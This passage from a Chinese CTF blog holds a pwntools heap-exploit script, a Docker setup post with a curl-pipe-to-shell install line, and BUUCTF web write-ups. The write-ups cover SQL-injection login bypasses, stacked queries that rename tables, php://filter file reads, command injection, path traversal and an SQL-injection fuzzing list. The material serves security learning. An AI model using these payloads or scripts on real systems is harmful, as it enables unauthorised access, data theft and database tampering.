&#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b&quot;\xff&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">sleep(1)</span><br><span class="line">def cmd(choice):</span><br><span class="line">    ru(&quot;Your choice:&quot;)</span><br><span class="line">    sl(str(choice))</span><br><span class="line"></span><br><span class="line">def add(index,size):</span><br><span class="line">    cmd(1)</span><br><span class="line">    ru(&quot;Index:&quot;)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(&quot;Size:&quot;)</span><br><span class="line">    sl(str(size))</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">    cmd(2)</span><br><span class="line">    ru(&quot;Index:&quot;)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(&quot;Content:&quot;)</span><br><span class="line">    s(content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    cmd(3)</span><br><span class="line">    ru(&quot;Index:&quot;)</span><br><span class="line">    sl(str(index))</span><br><span class="line"></span><br><span class="line">def cipher(index1,index2):</span><br><span class="line">    cmd(4)</span><br><span class="line">    sla(&quot;Text index: &quot;,str(index1))</span><br><span class="line">    sla(&quot;Passwd index: &quot;,str(index2))</span><br><span class="line"></span><br><span class="line">def decipher(index1,index2):</span><br><span class="line">    cmd(5)</span><br><span class="line">    sla(&quot;Text index: &quot;,str(index1))</span><br><span class="line">    sla(&quot;Passwd index: &quot;,str(index2))</span><br><span class="line"></span><br><span class="line">def exit():</span><br><span class="line">    cmd(6)</span><br><span class="line"></span><br><span class="line">add(0,0x14b0)#fastbin</span><br><span class="line">add(1,0x200)</span><br><span class="line">add(2,0x110)</span><br><span class="line">add(4,0x30)</span><br><span class="line">add(3,0x120)</span><br><span class="line">add(5,0x50)</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">edit(1,p64(0)*2)</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">edit(1,b&#x27;\x50&#x27;)</span><br><span class="line">add(6,0x200)</span><br><span class="line">add(7,0x200)</span><br><span class="line">delete(2)</span><br><span class="line">delete(3)</span><br><span class="line"></span><br><span class="line">edit(7,p64(0)+p64(0x4a1))</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">add(8,0x200)</span><br><span class="line">add(9,0x150)</span><br><span class="line">edit(2,b&#x27;\x80\xe6&#x27;)#_IO_2_1_stderr</span><br><span class="line">edit(3,b&#x27;\x40\xf9&#x27;)#global_max_fast</span><br><span class="line">add(10,0x110)</span><br><span class="line">add(11,0x110)</span><br><span class="line">add(12,0x120)</span><br><span class="line">add(13,0x120)</span><br><span class="line">edit(13,p64(0x60000))</span><br><span class="line">edit(11,p64(0xfbad1800)+p64(0)*4+p64(0x555555617960)+p64(0)*8+p64(2))</span><br><span class="line">#dbg()</span><br><span class="line">delete(0)</span><br><span class="line">dbg()</span><br><span class="line">edit(11,p64(0xfbad1800)+p64(0)*3+b&#x27;\x60&#x27;)</span><br><span class="line">#dbg()</span><br><span class="line">cmd(6)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<p>打stderr泄露</p>
<h3 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h3><p>暂时还没复现</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/10/16/docker/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/10/16/docker/" class="post-title-link" itemprop="url">docker</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2022-10-16 00:02:57 / Modified: 00:20:29" itemprop="dateCreated datePublished" datetime="2022-10-16T00:02:57+08:00">2022-10-16</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>docker理解起来就相当于一个小型的虚拟机， 主要是想学着用来跑一些pwn题</p>
<p>安装docker:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure>

<p>启用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure>

<p>下面以hello-world和Ubuntu镜像文件为例，演示一些docker的基本操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker image pull library/hello-world #抓取镜像文件</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/hello-world</span><br><span class="line">Digest: sha256:18a657d0cc1c7d0678a3fbea8b7eb4918bba25968d3e1b0adebfa71caddbc346</span><br><span class="line">Status: Image is up to date for hello-world:latest</span><br><span class="line">docker.io/library/hello-world:latest</span><br><span class="line">$ sudo docker image ls #查看本地的镜像文件</span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">youlin666     latest    58500f9d97e4   10 hours ago    359MB</span><br><span class="line">youlin        latest    58500f9d97e4   10 hours ago    359MB</span><br><span class="line">ubuntu        22.04     216c552ea5ba   10 days ago     77.8MB</span><br><span class="line">hello-world   latest    feb5d9fea6a5   12 months ago   13.3kB</span><br><span class="line">$ sudo docker run hello-world #生成容器并运行，该容器输出错误信息后自动终止</span><br><span class="line"></span><br><span class="line">Hello from Docker!</span><br><span class="line">This message shows that your installation appears to be working correctly.</span><br><span class="line"></span><br><span class="line">To generate this message, Docker took the following steps:</span><br><span class="line"> 1. The Docker client contacted the Docker daemon.</span><br><span class="line"> 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub.</span><br><span class="line">    (amd64)</span><br><span class="line"> 3. The Docker daemon created a new container from that image which runs the</span><br><span class="line">    executable that produces the output you are currently reading.</span><br><span class="line"> 4. The Docker daemon streamed that output to the Docker client, which sent it</span><br><span class="line">    to your terminal.</span><br><span class="line"></span><br><span class="line">To try something more ambitious, you can run an Ubuntu container with:</span><br><span class="line"> $ docker run -it ubuntu bash</span><br><span class="line"></span><br><span class="line">Share images, automate workflows, and more with a free Docker ID:</span><br><span class="line"> https://hub.docker.com/</span><br><span class="line"></span><br><span class="line">For more examples and ideas, visit:</span><br><span class="line"> https://docs.docker.com/get-started/</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker run -it ubuntu /bin/bash #启动一个不会自动终止的Ubuntu容器 ctrl+P+Q可推出控制台，容器保持后台运行</span><br><span class="line">$ sudo docker ps #列出正在运行的容器</span><br><span class="line">$ sudo docker stop xxxx #停止正在运行的容器</span><br></pre></td></tr></table></figure>

<h1 id="pwn题部署"><a href="#pwn题部署" class="headerlink" title="pwn题部署"></a>pwn题部署</h1><p>板子推荐：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/17kjRaw3FietYA3UxvJeiCw?pwd=0a5e">https://pan.baidu.com/s/17kjRaw3FietYA3UxvJeiCw?pwd=0a5e</a> </p>
<p>首先将pwn题复制到bin目录下，并且改名为pwn</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker build -t &quot;test&quot; ./</span><br><span class="line">$ sudo docker run -d -p &quot;0.0.0.0:10005:9999&quot; -h &quot;test&quot; --name &quot;test&quot; test</span><br></pre></td></tr></table></figure>

<p>题目就可以在docker里面跑起来了，占用的是10005的端口</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/10/14/buu-web%EF%BC%881-20%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/10/14/buu-web%EF%BC%881-20%EF%BC%89/" class="post-title-link" itemprop="url">buu_web（1-20）</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-10-14 00:15:17" itemprop="dateCreated datePublished" datetime="2022-10-14T00:15:17+08:00">2022-10-14</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-11-19 00:39:28" itemprop="dateModified" datetime="2022-11-19T00:39:28+08:00">2022-11-19</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>万能密码注入：’ or 1=1#</p>
<p>分析一下为什么这可以进后台，如果sql语句这样写：select * from admin where name=’”.$_POST[‘name’].”‘and password=’”.$_POST[‘password’].”‘“ 　　如果我们在账号处输入万能密码’or 1=1#</p>
<p>#后面的语句将会被注释掉，前面的条件就为真,这样无论我们输入什么密码，都可以进入了。</p>
<p>这有个小提示，存在字符型注入的php网站是可以用万能密码’or 1=1#来注入的</p>
<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>应该算是一道比较简单的php代码审计，查看网页源码可以知道php代码在/source.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#x27;file&#x27;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>进入/hint.php,可以看到打印了4次flag，直接目录穿越/file=hint.php?../../../../../ffffllllaaaagggg</p>
<h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p><img src="https://tuchuangs.com/imgs/2022/10/14/241905f313b3cb6e.png"></p>
<p>看源码一眼丁真，直接用get方式给cat传参/?cat=dog</p>
<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p><img src="https://tuchuangs.com/imgs/2022/10/14/2bb2ba9150e8feea.png">既然该文件名为flag.php，那么flag应该就存在于此文件中，但是我们f12并没有查看到flag，猜测flag应该是在flag.php的源代码当中</p>
<p>我们可以利用php://filter伪协议来查看flag.php的源代码，构造payload：<code>?file=php://filter/convert.base64-encode/resource=flag.php</code></p>
<p>可以获得将flag base64加密后的内容</p>
<h3 id="知识详解"><a href="#知识详解" class="headerlink" title="知识详解"></a>知识详解</h3><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>作用：php://filter可以获取指定文件源码。当其与文件包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，阻止其不执行，从而读取任意文件源代码。[1]<br>场景：</p>
<p>知道flag文件地址后，可以直接用该协议读取文件内容<br>有时候一些关键字被过滤也可以用该协议绕过<br>有的flag隐藏在注释当中，可通过此协议查看源码获取flag</p>
<p>格式：xxx.php?xxx=php://filter/convert.base64-encode/resource=xxx.php<br>利用条件：</p>
<p>不受allow_url_include和allow_url_fopen的限制</p>
<h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>通过|（按位或）来进行任意命令执行，直接执行后面的指令，0 | ls /查看根目录内容，0| cat /flag打印出flag</p>
<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>1，测试 1’ or 1=1 # ,初步判定存在SQL注入。 </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 #</span></span><br></pre></td></tr></table></figure>

<p>再测试字段数，到3时报错，说明字段数为2</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 1 # </span></span><br></pre></td></tr></table></figure>

<p>接着尝试union注入,回显了过滤的关键字。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2#</span></span><br></pre></td></tr></table></figure>

<p>堆叠注入：</p>
<p>先通过show databases爆出数据库。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show databases; #</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tuchuangs.com/imgs/2022/10/16/a0b6ae9e9e31c3f8.png"></p>
<p>然后用 show tables 尝试爆表。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show tables; #</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20191126153703437.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70"></p>
<p>可以看到这里有两个表，我们先爆words表的内容。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; show columns from words; #</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/2019112615410246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70"></p>
<p>这里一个知识点，表名为数字时，要用反引号包起来查询。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show columns from `1919810931114514`; #</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20191126154451163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70"></p>
<p>解题思路：</p>
<p>1，通过 rename 先把 words 表改名为其他的表名。</p>
<p>2，把 1919810931114514 表的名字改为 words 。</p>
<p>3 ，给新 words 表添加新的列名 id 。</p>
<p>4，将 flag 改名为 data 。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</span><br></pre></td></tr></table></figure>

<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>和前一题比较像，先尝试下堆叠注入</p>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">show</span> tables;</span><br><span class="line">Array ( [<span class="number">0</span>] =&gt; <span class="number">1</span> ) Array ( [<span class="number">0</span>] =&gt; Flag ) </span><br></pre></td></tr></table></figure>

<p>输入1;show columns from Flag，返回的内容是Nonono,查一下过滤了哪些词</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://2bc458c5-21ff-4740-b290-024b3fd90a35.node4.buuoj.cn:81&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;sql-fuzz.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        data = &#123;<span class="string">&quot;query&quot;</span>: line&#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;Nonono&#x27;</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            <span class="built_in">print</span>(line.strip(),end=<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">“or “a”=“a</span><br><span class="line">&#x27;)or(‘a’=‘a</span><br><span class="line">or 1=1–</span><br><span class="line">‘or 1=1–</span><br><span class="line">a’or’ 1=1–</span><br><span class="line">&quot;or 1=1–</span><br><span class="line">‘or’a’=‘a</span><br><span class="line">“or”=&quot;a’=‘a</span><br><span class="line">‘or’’=’</span><br><span class="line">‘or’=‘or’</span><br><span class="line">1 or ‘1’=‘1’=1</span><br><span class="line">1 or ‘1’=‘1’ or 1=1</span><br><span class="line">&#x27;OR 1=1</span><br><span class="line">“or 1=1</span><br><span class="line">&#x27;xor</span><br><span class="line">‘or 1=1/*</span><br><span class="line">1’or’1’=‘1</span><br><span class="line">a’ or 1=1–</span><br><span class="line">“a”” or 1=1–”</span><br><span class="line">or a = a</span><br><span class="line">a’ or ‘a’ = ‘a</span><br><span class="line">1 or 1=1</span><br><span class="line">a’ waitfor delay ‘0:0:10’–</span><br><span class="line">1 waitfor delay ‘0:0:10’–</span><br><span class="line">’ or 1=1</span><br><span class="line">ý or 1=1 –</span><br><span class="line">x’ AND userid IS NULL; –</span><br><span class="line">x’ AND email IS NULL; –</span><br><span class="line">anything’ OR ‘x’=‘x</span><br><span class="line">x’ AND 1=(SELECT COUNT() FROM tabname); –</span><br><span class="line">x’ AND members.email IS NULL; –</span><br><span class="line">x’ OR full_name LIKE ‘%Bob%</span><br><span class="line">23 OR 1=1</span><br><span class="line">‘%20or%20’’=’</span><br><span class="line">‘%20or%20’x’=&#x27;x</span><br><span class="line">%20or%20x=x</span><br><span class="line">‘)%20or%20(‘x’=‘x</span><br><span class="line">0 or 1=1</span><br><span class="line">’ or 0=0 –</span><br><span class="line">&quot; or 0=0 –</span><br><span class="line">or 0=0 –</span><br><span class="line">’ or 0=0 #</span><br><span class="line">) or (a=a</span><br><span class="line">hi or a=a</span><br><span class="line">hi or 1=1 --&quot;</span><br><span class="line">hi’ or 1=1 –</span><br><span class="line">hi’ or ‘a’=‘a</span><br><span class="line">hi’) or (‘a’=&#x27;a</span><br><span class="line">“hi”&quot;) or (&quot;“a”&quot;=&quot;“a”</span><br><span class="line">‘hi’ or ‘x’=‘x’;</span><br><span class="line">insert</span><br><span class="line">or</span><br><span class="line">order by</span><br><span class="line">delete</span><br><span class="line">update</span><br><span class="line">like</span><br><span class="line">handler</span><br><span class="line">’ or username like &#x27;%</span><br><span class="line">’ or uname like &#x27;%</span><br><span class="line">’ or userid like &#x27;%</span><br><span class="line">’ or uid like &#x27;%</span><br><span class="line">’ or user like &#x27;%</span><br><span class="line">–sp_password</span><br><span class="line">\x27UNION SELECT</span><br><span class="line">’ UNION SELECT</span><br><span class="line">’ UNION ALL SELECT</span><br><span class="line">’ or (EXISTS)</span><br><span class="line">&amp;</span><br><span class="line">’ or ‘’=’</span><br><span class="line">x’ or 1=1 or ‘x’=&#x27;y</span><br><span class="line">a’ or 3=3–</span><br><span class="line">“a”&quot; or 3=3–&quot;</span><br><span class="line">’ or 3=3</span><br><span class="line">ý or 3=3 –</span><br><span class="line">&quot;</span><br><span class="line">‘or select *</span><br><span class="line">’ or ‘x’=‘x</span><br><span class="line">&quot; or “x”=“x</span><br><span class="line">‘) or (‘x’=‘x</span><br><span class="line">&quot; or 0=0 #</span><br><span class="line">&quot;’ or 1 --’”</span><br><span class="line">&quot; or 1=1 or “”=&quot;</span><br><span class="line">&quot; or “a”=&quot;a</span><br><span class="line">“) or (“a”=“a</span><br><span class="line">hi” or “a”=“a</span><br><span class="line">hi” or 1=1 –</span><br><span class="line">hi”) or (“a”=“a</span><br><span class="line">&lt;&gt;”’%😉(&amp;+</span><br><span class="line">’ and ‘’ like ’</span><br></pre></td></tr></table></figure>

<p>查询网上的wp</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入1</span><br><span class="line"></span><br><span class="line">Array ( [<span class="number">0</span>] =&gt; <span class="number">1</span> ) </span><br><span class="line"></span><br><span class="line">输入0或者其他字母均没有回显</span><br><span class="line"></span><br><span class="line">输入上面过滤的字符会显示Nonono.</span><br></pre></td></tr></table></figure>

<p>综上，可以猜测后台的SQL语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $_GET[&#x27;query&#x27;] || flag from Flag</span><br></pre></td></tr></table></figure>

